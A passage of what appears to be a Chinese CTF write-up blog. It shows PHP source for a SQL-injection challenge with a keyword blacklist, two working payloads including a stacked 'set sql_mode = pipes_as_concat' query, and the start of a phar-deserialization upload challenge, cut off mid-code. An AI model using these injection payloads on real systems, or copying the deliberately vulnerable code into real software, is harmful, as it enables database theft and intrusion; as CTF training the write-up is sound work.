punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">global</span> <span class="token variable">$MysqlLink</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//GetPara();</span>    <span class="token variable">$MysqlLink</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token variable">$datauser</span><span class="token punctuation">,</span><span class="token variable">$datapass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$MysqlLink</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Mysql Connect Error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$selectDB</span> <span class="token operator">=</span> <span class="token function">mysqli_select_db</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">,</span><span class="token variable">$dataName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$selectDB</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Choose Database Error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$post</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//die();</span>    <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">></span></span></span> Give me your flag<span class="token punctuation">,</span> I will tell you <span class="token keyword">if</span> the flag is right<span class="token punctuation">.</span> <span class="token markup">&lt;/ a></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$BlackList</span> <span class="token operator">=</span> <span class="token string">"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\""</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//var_dump(preg_match("/{$BlackList}/is",$post['query']));</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/{$BlackList}/is"</span><span class="token punctuation">,</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//echo $post['query'];</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Nonono."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Too long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select "</span><span class="token punctuation">.</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"||flag from Flag"</span><span class="token punctuation">;</span>        <span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">do</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysqli_store_result</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_row</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span>@<span class="token function">mysqli_next_result</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token delimiter">?></span></code></pre><p>“select “.$post[‘query’].”||flag from Flag”</p><p>需要通过||带出flag</p><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><p>set sql_mode = pipes_as_concat可以改变||的作用为连接字符串</p><p>例子</p><pre class=" language-mysql"><code class="language-mysql">mysql> select "na"||"me" from users ;+------------+| "na"||"me" |+------------+|          0 |+------------+mysql> set sql_mode = pipes_as_concat;mysql> select "na"||"me" from users ;+------------+| "na"||"me" |+------------+| name       |+------------+mysql> select 1||roisflag from flag;+-------------+| 1||roisflag |+-------------+| 1fctf{123}  || 1flag{1}    |+-------------+</code></pre><p>设置之后，随意输入字符串就能返回该字符串和flag拼接的内容</p><p>payload为 <code>1;set sql_mode = pipes_as_concat;select 1</code></p><h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h3><p>通过<code>,</code></p><p><code>select *,1||flag from Flag</code>可以查出flag</p><h2 id="upload2-phar反序列化"><a href="#upload2-phar反序列化" class="headerlink" title="upload2(phar反序列化)"></a>upload2(phar反序列化)</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>给了源码</p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//index.php</span><span class="token keyword">include</span> <span class="token string">'class.php'</span><span class="token punctuation">;</span><span class="token variable">$userdir</span> <span class="token operator">=</span> <span class="token string">"upload/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"upload"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 允许上传的图片后缀</span>    <span class="token variable">$allowedExts</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"gif"</span><span class="token punctuation">,</span> <span class="token string">"jpeg"</span><span class="token punctuation">,</span> <span class="token string">"jpg"</span><span class="token punctuation">,</span> <span class="token string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$tmp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/gif"</span><span class="token punctuation">)</span>            <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/jpeg"</span><span class="token punctuation">)</span>            <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/png"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">204800</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">// 小于 200 kb</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span> <span class="token variable">$allowedExts</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Check</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"错误：: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">,</span> <span class="token variable">$userdir</span> <span class="token punctuation">.</span> <span class="token string">"/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"."</span> <span class="token punctuation">.</span> <span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"文件存储在: "</span> <span class="token punctuation">.</span> <span class="token variable">$userdir</span> <span class="token punctuation">.</span> <span class="token string">"/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"."</span> <span class="token punctuation">.</span> <span class="token variable">$extension</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"非法的文件格式"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//func.php</span><span class="token keyword">include</span> <span class="token string">'class.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"submit"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i'</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Go away!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$file_path</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMIME</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;p>Your file type is '$file' &lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//class.php</span><span class="token keyword">include</span> <span class="token string">'config.php'</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">File</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$type</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string">"Check"</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file_name</span> <span class="token operator">=</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionClass</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$class</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">newInstanceArgs</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">getMIME</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$finfo</span> <span class="token operator">=</span> <span class="token function">finfo_open</span><span class="token punctuation">(</span><span class="token constant">FILEINFO_MIME_TYPE</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//返回mine类型</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">type</span> <span class="token operator">=</span> <span class="token function">finfo_file</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">finfo_close</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">type</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Check</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file_name</span> <span class="token operator">=</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">"&lt;?"</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&amp;lt;? in contents!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//admin.php</span><span class="token keyword">include</span> <span class="token string">'config.php'</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Ad</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$ip</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$port</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$clazz</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$func1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$func2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$func3</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$instance</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$arg1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$arg2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$arg3</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">,</span> <span class="token variable">$clazz</span><span class="token punctuation">,</span> <span class="token variable">$func1</span><span class="token punctuation">,</span> <span class="token variable">$func2</span><span class="token punctuation">,</span> <span class="token variable">$func3</span><span class="token punctuation">,</span> <span class="token variable">$arg1</span><span class="token punctuation">,</span> <span class="token variable">$arg2</span><span class="token punctuation">,</span> <span class="token variable">$arg3</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ip</span> <span class="token operator">=</span> <span class="token variable">$ip</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">port</span> <span class="token operator">=</span> <span class="token variable">$port</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">clazz</span> <span class="token operator">=</span> <span class="token variable">$clazz</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func1</span> <span class="token operator">=</span> <span class="token variable">$func1</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func2</span> <span class="token operator">=</span> <span class="token variable">$func2</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func3</span> <span class="token operator">=</span> <span class="token variable">$func3</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">arg1</span> <span class="token operator">=</span> <span class="token variable">$arg1</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">arg2</span> <span class="token operator">=</span> <span class="token variable">$arg2</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">arg3</span> <span class="token operator">=</span> <span class="token variable">$arg3</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$reflect</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionClass</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">clazz</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">instance</span> <span class="token operator">=</span> <span class="token variable">$reflect</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">newInstanceArgs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$reflectionMethod</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionMethod</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">clazz</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$reflectionMethod</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">instance</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">arg1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$reflectionMethod</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionMethod</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">clazz</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$reflectionMethod</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">instance</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">arg2</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">arg2</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">arg2</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">arg2</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">arg2</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$reflectionMethod</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionMethod</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">clazz</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$reflectionMethod</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">instance</span><span class="token punctuation">,</span> <span class="token 